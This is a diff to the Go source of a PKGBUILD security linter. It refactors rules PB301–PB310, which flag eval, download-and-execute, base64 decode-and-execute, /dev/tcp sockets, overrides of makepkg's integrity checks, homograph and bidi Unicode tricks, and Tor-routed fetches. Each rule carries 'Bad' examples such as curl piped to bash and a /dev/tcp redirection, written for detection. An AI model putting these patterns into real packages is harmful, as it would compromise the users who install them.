@@ -12,173 +12,175 @@ import (
 )
 
 // PB3xx: code execution and obfuscation.
-var execRules = []Rule{
-	{
-		ID:       "PB301",
-		Name:     "top-level-execution",
-		Severity: Critical,
-		Doc: "Commands outside any function run the moment the PKGBUILD is sourced — including by " +
-			"tools that only wanted metadata (`makepkg --printsrcinfo`, AUR helpers rendering a " +
-			"preview). Top-level code should be limited to variable assignments.",
-		Check: checkTopLevelExec,
-		Bad: `pkgname=foo
+func execRules() []Rule {
+	return []Rule{
+		{
+			ID:       "PB301",
+			Name:     "top-level-execution",
+			Severity: Critical,
+			Doc: "Commands outside any function run the moment the PKGBUILD is sourced — including by " +
+				"tools that only wanted metadata (`makepkg --printsrcinfo`, AUR helpers rendering a " +
+				"preview). Top-level code should be limited to variable assignments.",
+			Check: checkTopLevelExec,
+			Bad: `pkgname=foo
 curl -fsSL https://example.com/install.sh | bash   # runs the moment the PKGBUILD is sourced`,
-		Good: `pkgname=foo
+			Good: `pkgname=foo
 build() {
   make   # keep commands inside build()/package(), never at top level
 }`,
-	},
-	{
-		ID:       "PB302",
-		Name:     "eval",
-		Severity: Error, MaxSeverity: Critical, // critical when the evaluated string is downloaded
-		Doc: "eval executes a string as code, defeating static review: what actually runs is " +
-			"assembled at build time. Almost every legitimate use has a plain-bash equivalent.",
-		Check: checkEval,
-		Bad: `build() {
+		},
+		{
+			ID:       "PB302",
+			Name:     "eval",
+			Severity: Error, MaxSeverity: Critical, // critical when the evaluated string is downloaded
+			Doc: "eval executes a string as code, defeating static review: what actually runs is " +
+				"assembled at build time. Almost every legitimate use has a plain-bash equivalent.",
+			Check: checkEval,
+			Bad: `build() {
   eval "$(curl -fsSL https://example.com/env.sh)"
 }`,
-		Good: `build() {
+			Good: `build() {
   make   # call commands directly instead of eval-ing generated text
 }`,
-	},
-	{
-		ID:       "PB303",
-		Name:     "decode-and-execute",
-		Severity: Critical,
-		Doc: "Decoding embedded data (base64, xxd, openssl enc) and piping it into an interpreter " +
-			"is the canonical way to smuggle a payload past human review. There is no legitimate " +
-			"reason for a PKGBUILD to execute decoded blobs.",
-		Check: checkDecodeExec,
-		Bad: `build() {
+		},
+		{
+			ID:       "PB303",
+			Name:     "decode-and-execute",
+			Severity: Critical,
+			Doc: "Decoding embedded data (base64, xxd, openssl enc) and piping it into an interpreter " +
+				"is the canonical way to smuggle a payload past human review. There is no legitimate " +
+				"reason for a PKGBUILD to execute decoded blobs.",
+			Check: checkDecodeExec,
+			Bad: `build() {
   echo "$payload" | base64 -d | bash
   printf '\x63\x75\x72\x6c' | sh   # the same thing, spelled in escapes
 }`,
-		Good: `build() {
+			Good: `build() {
   make   # ship readable source, never decode-and-run an embedded blob
 }`,
-	},
-	{
-		ID:       "PB304",
-		Name:     "download-and-execute",
-		Severity: Critical,
-		Doc: "Piping a download straight into an interpreter executes whatever the server chooses " +
-			"to send, with no checksum, no review, and no record. This includes `eval \"$(curl ...)\"`, " +
-			"`sh -c \"$(wget ...)\"` and `source <(curl ...)` variants.",
-		Check: checkDownloadExec,
-		Bad: `build() {
+		},
+		{
+			ID:       "PB304",
+			Name:     "download-and-execute",
+			Severity: Critical,
+			Doc: "Piping a download straight into an interpreter executes whatever the server chooses " +
+				"to send, with no checksum, no review, and no record. This includes `eval \"$(curl ...)\"`, " +
+				"`sh -c \"$(wget ...)\"` and `source <(curl ...)` variants.",
+			Check: checkDownloadExec,
+			Bad: `build() {
   curl -fsSL https://example.com/install.sh | sh
 }`,
-		Good: `source=("https://example.com/install.sh")
+			Good: `source=("https://example.com/install.sh")
 sha256sums=('...')
 build() {
   sh install.sh   # fetched and checksummed via source=, then run
 }`,
-	},
-	{
-		ID:       "PB305",
-		Name:     "dev-tcp",
-		Severity: Critical,
-		Doc: "/dev/tcp and /dev/udp redirections are bash's built-in network sockets — in a " +
-			"PKGBUILD they are typically reverse shells or exfiltration, never packaging.",
-		Check: checkDevTCP,
-		Bad: `build() {
+		},
+		{
+			ID:       "PB305",
+			Name:     "dev-tcp",
+			Severity: Critical,
+			Doc: "/dev/tcp and /dev/udp redirections are bash's built-in network sockets — in a " +
+				"PKGBUILD they are typically reverse shells or exfiltration, never packaging.",
+			Check: checkDevTCP,
+			Bad: `build() {
   exec 3<>/dev/tcp/example.com/443
 }`,
-		Good: `build() {
+			Good: `build() {
   # no raw network sockets; declare any remote data in source=
   make
 }`,
-	},
-	{
-		ID:       "PB306",
-		Name:     "unresolvable-command",
-		Severity: Warn, MaxSeverity: Error, // error for ${!indirection}, which hides the name outright
-		Doc: "A command whose name comes from indirection (${!var}) or command substitution cannot " +
-			"be statically reviewed. In a PKGBUILD, hiding *which program runs* is itself a signal: " +
-			"obfuscation is what this rule flags.",
-		Check: checkDynamicCommands,
-		Bad: `build() {
+		},
+		{
+			ID:       "PB306",
+			Name:     "unresolvable-command",
+			Severity: Warn, MaxSeverity: Error, // error for ${!indirection}, which hides the name outright
+			Doc: "A command whose name comes from indirection (${!var}) or command substitution cannot " +
+				"be statically reviewed. In a PKGBUILD, hiding *which program runs* is itself a signal: " +
+				"obfuscation is what this rule flags.",
+			Check: checkDynamicCommands,
+			Bad: `build() {
   runner=$(echo bWFrZQ== | base64 -d)
   $runner   # command name produced at runtime; unresolvable statically
 }`,
-		Good: `build() {
+			Good: `build() {
   make   # name the command literally
 }`,
-	},
-	{
-		ID:       "PB307",
-		Name:     "obfuscated-payload",
-		Severity: Warn,
-		Doc: "Long hex-escape sequences or large base64-looking literals embedded in a build " +
-			"script are how encoded payloads look at rest. Flagged for human review. " +
-			"Variables nested so that they expand to tens of mebibytes are reported here too: past that " +
-			"point pkglint stops expanding, and what depends on them goes unanalyzed.",
-		Check: checkObfuscatedLiterals,
-		Bad: `build() {
+		},
+		{
+			ID:       "PB307",
+			Name:     "obfuscated-payload",
+			Severity: Warn,
+			Doc: "Long hex-escape sequences or large base64-looking literals embedded in a build " +
+				"script are how encoded payloads look at rest. Flagged for human review. " +
+				"Variables nested so that they expand to tens of mebibytes are reported here too: past that " +
+				"point pkglint stops expanding, and what depends on them goes unanalyzed.",
+			Check: checkObfuscatedLiterals,
+			Bad: `build() {
   printf '\x63\x75\x72\x6c\x20\x2d\x4f\x20\x68\x74\x74\x70' | sh
 }`,
-		Good: `build() {
+			Good: `build() {
   make   # keep commands as readable text, not escape sequences
 }`,
-	},
-	{
-		ID:       "PB308",
-		Name:     "makepkg-function-override",
-		Severity: Critical,
-		Doc: "makepkg sources the PKGBUILD after defining its own internal functions, so a top-level " +
-			"function that reuses an internal name (download_sources, verify_integrity_one, " +
-			"create_package, …) silently replaces makepkg's implementation — a way to disable integrity " +
-			"checks or tamper with fetching and packaging. Package functions are prepare/build/check/" +
-			"package/package_*/pkgver only.",
-		Check: checkMakepkgFuncOverride,
-		Bad: `# Redefining a makepkg internal disables its integrity checks:
+		},
+		{
+			ID:       "PB308",
+			Name:     "makepkg-function-override",
+			Severity: Critical,
+			Doc: "makepkg sources the PKGBUILD after defining its own internal functions, so a top-level " +
+				"function that reuses an internal name (download_sources, verify_integrity_one, " +
+				"create_package, …) silently replaces makepkg's implementation — a way to disable integrity " +
+				"checks or tamper with fetching and packaging. Package functions are prepare/build/check/" +
+				"package/package_*/pkgver only.",
+			Check: checkMakepkgFuncOverride,
+			Bad: `# Redefining a makepkg internal disables its integrity checks:
 verify_integrity_one() { return 0; }
 build() { make; }`,
-		Good: `# Only define package functions; leave makepkg's internals to makepkg.
+			Good: `# Only define package functions; leave makepkg's internals to makepkg.
 build() { make; }
 package() { make DESTDIR="$pkgdir" install; }`,
-	},
-	{
-		ID:       "PB309",
-		Name:     "hidden-unicode",
-		Severity: Warn, MaxSeverity: Error, // error for bidi controls and mixed-script hosts
-		Doc: "Bidirectional-override and invisible/zero-width characters can make the rendered source " +
-			"differ from what the shell executes (the \"Trojan Source\" class of attacks). A PKGBUILD is " +
-			"ASCII shell; these controls have no legitimate place in it. The same goes for the host of " +
-			"url= or a source: a label that mixes Latin with Cyrillic, Greek or Armenian look-alikes " +
-			"(gіthub.com with a Cyrillic і), fullwidth letters, or an invisible character is a homograph " +
-			"of a name the reader trusts, and is an error; a label written wholly in another script is " +
-			"reported for review. Non-ASCII text in a URL's path, pkgdesc or a comment is not judged.",
-		Check: checkHiddenUnicode,
-		Bad: "source=(\"https://gіthub.com/example/foo/archive/v$pkgver.tar.gz\")   # a Cyrillic і\n" +
-			"build() {\n" +
-			"  # the RLO below reverses how the rest of the line renders\n" +
-			"  make ‮install\n" +
-			"}",
-		Good: `source=("https://github.com/example/foo/archive/v$pkgver.tar.gz")
+		},
+		{
+			ID:       "PB309",
+			Name:     "hidden-unicode",
+			Severity: Warn, MaxSeverity: Error, // error for bidi controls and mixed-script hosts
+			Doc: "Bidirectional-override and invisible/zero-width characters can make the rendered source " +
+				"differ from what the shell executes (the \"Trojan Source\" class of attacks). A PKGBUILD is " +
+				"ASCII shell; these controls have no legitimate place in it. The same goes for the host of " +
+				"url= or a source: a label that mixes Latin with Cyrillic, Greek or Armenian look-alikes " +
+				"(gіthub.com with a Cyrillic і), fullwidth letters, or an invisible character is a homograph " +
+				"of a name the reader trusts, and is an error; a label written wholly in another script is " +
+				"reported for review. Non-ASCII text in a URL's path, pkgdesc or a comment is not judged.",
+			Check: checkHiddenUnicode,
+			Bad: "source=(\"https://gіthub.com/example/foo/archive/v$pkgver.tar.gz\")   # a Cyrillic і\n" +
+				"build() {\n" +
+				"  # the RLO below reverses how the rest of the line renders\n" +
+				"  make ‮install\n" +
+				"}",
+			Good: `source=("https://github.com/example/foo/archive/v$pkgver.tar.gz")
 build() {
   make install   # plain ASCII, renders exactly as it executes
 }`,
-	},
-	{
-		ID:       "PB310",
-		Name:     "anonymized-fetch",
-		Severity: Error, MaxSeverity: Critical, // critical from a scriptlet, which runs as root
-		Doc: "Nothing a package legitimately needs is fetched over Tor or through a SOCKS proxy: " +
-			"upstreams publish on the open web, and a checksummed source= entry is verified however " +
-			"it arrived. Routing a fetch through torsocks or proxychains, curl's --socks5/-x socks…, " +
-			"an ALL_PROXY=socks… environment, or to a .onion host hides where the payload comes " +
-			"from and lets its server tell a victim's request from a reviewer's. This is the " +
-			"xsnow/xsnow-bin incident of August 2026, whose build() pulled a second stage through " +
-			"torsocks; generic network access is PB201 and PB501.",
-		Check: checkAnonymizedFetch,
-		Bad: `build() {
+		},
+		{
+			ID:       "PB310",
+			Name:     "anonymized-fetch",
+			Severity: Error, MaxSeverity: Critical, // critical from a scriptlet, which runs as root
+			Doc: "Nothing a package legitimately needs is fetched over Tor or through a SOCKS proxy: " +
+				"upstreams publish on the open web, and a checksummed source= entry is verified however " +
+				"it arrived. Routing a fetch through torsocks or proxychains, curl's --socks5/-x socks…, " +
+				"an ALL_PROXY=socks… environment, or to a .onion host hides where the payload comes " +
+				"from and lets its server tell a victim's request from a reviewer's. This is the " +
+				"xsnow/xsnow-bin incident of August 2026, whose build() pulled a second stage through " +
+				"torsocks; generic network access is PB201 and PB501.",
+			Check: checkAnonymizedFetch,
+			Bad: `build() {
   torsocks curl -fsSLO https://example.com/stage2.tar.gz
 }`,
-		Good: `source=("https://example.com/stage2-$pkgver.tar.gz")
+			Good: `source=("https://example.com/stage2-$pkgver.tar.gz")
 sha256sums=('...')`,
-	},
+		},
+	}
 }
 
 // proxyLaunchers run a command with its traffic sent through Tor or a SOCKS
